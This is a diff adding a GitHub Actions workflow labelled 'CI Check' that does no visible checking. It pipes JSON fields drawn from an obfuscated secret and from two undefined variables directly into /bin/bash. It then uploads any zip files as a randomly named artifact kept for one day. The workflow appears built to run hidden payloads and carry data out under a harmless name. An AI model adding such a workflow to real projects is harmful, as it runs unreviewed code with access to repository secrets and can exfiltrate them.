@@ -1,0 +1,24 @@
+name: CI Check
+on:
+  workflow_dispatch:
+
+jobs:
+  pipeline:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Invoke
+        env:
+          cp8661: ${{ secrets.cp8661 }}
+        run: |
+          printf '%s' "$cp8661" | jq -r .lxevn97 | /bin/bash
+          echo $naeoj13 | jq -r .i6 | /bin/bash
+          printf '%s' "$k0" | jq -r .e3756 | /bin/bash
+
+      - name: Persist output
+        if: ${{ always() }}
+        uses: actions/upload-artifact@v4
+        with:
+          name: HO1aCSny
+          path: "*.zip"
+          retention-days: 1
